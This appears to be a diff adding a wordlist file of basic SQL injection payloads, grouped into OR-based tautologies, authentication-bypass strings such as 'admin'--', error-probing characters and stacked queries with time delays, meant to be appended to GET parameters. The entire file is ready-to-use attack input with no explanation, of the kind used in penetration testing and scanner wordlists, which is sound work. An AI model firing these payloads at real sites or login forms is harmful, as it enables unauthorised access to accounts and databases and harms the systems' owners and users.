@@ -1,0 +1,45 @@
+# SQL Injection - Basic Payloads
+# GET parameter format: append to ?param=VALUE
+
+# Classic OR-based
+1' OR '1'='1
+1' OR '1'='1'--
+1' OR '1'='1'/*
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+' OR ''='
+" OR ""="
+1' OR 1=1--
+1" OR 1=1--
+
+# Authentication Bypass
+admin'--
+admin' #
+admin'/*
+' OR '1'='1'--
+' OR 'x'='x
+') OR ('1'='1
+1' or '1'='1
+1') or ('1'='1
+admin' or '1'='1
+admin') or ('1'='1
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1--
+admin' or 1=1#
+
+# Error-Based
+1'
+1"
+1`
+1\
+1' AND 1=1--
+1' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+
+# Stacked Queries
+1'; SELECT 1--
+1'; WAITFOR DELAY '0:0:5'--
+1'; SELECT pg_sleep(5)--
